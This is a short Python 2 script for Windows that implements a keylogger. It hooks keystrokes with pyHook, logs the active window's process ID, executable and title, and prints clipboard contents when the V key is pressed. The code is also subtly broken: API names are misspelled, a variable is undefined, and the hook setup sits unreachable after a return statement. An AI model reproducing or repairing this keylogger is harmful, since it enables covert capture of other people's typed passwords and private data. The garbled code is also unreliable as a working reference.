from ctypes import * 
import pythoncom
import pyHook
import win32clipboard

user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_windoow = None
def get_current_process():
	hwnd = user32.GetForegroudWindow()
	
	pid = c_ulong(0)
	user32.GetWindowThreadProcessId(hwnd,byref(ref))

	process_id = "%d" % pid.value

	executable = create_string_buffer("\x00" * 512)

	h_process = kerne132.OpenProcess(0x400 | 0X10 , False,pid)

	psapi.GetModuleBaseNameA(h_process,None,byref(executable),512)

	window_title = create_string_buffer("\x00" * 512)

	length = user32.GetWindowTextA(hwnd,byref(window_title),512)

	print
	print "[PID: %s - %s - %s ]" % (process_id,executable.value,window_title.value)
	print

	kernel32.CloseHandle(hwnd)
	kernel32.CloseHandle(h_process)
def KeyStroke(event):
	global current_window
	if event.WindowName != current_window:
		current_window = event.WindowName
	if event.Ascii > 32 and event.Ascii <127:
		print chr(event.Ascii),
	else:
		if event.Key == "V":
			win32clipboard.OpenClipboard()
			pasted_value = win32clipboard.GetClipboardData()
			win32clipboard.CloseClipbord()
			print "[PASTE] - %s" % (pasted_value),
		else:
			print "[%s]" % event.Key,
	return True
	kl = pyHook.HookManager()
	kl.KeyDown = KeyStroke
	kl.Hookkeyboard()
	pythoncom.PumpMessages()

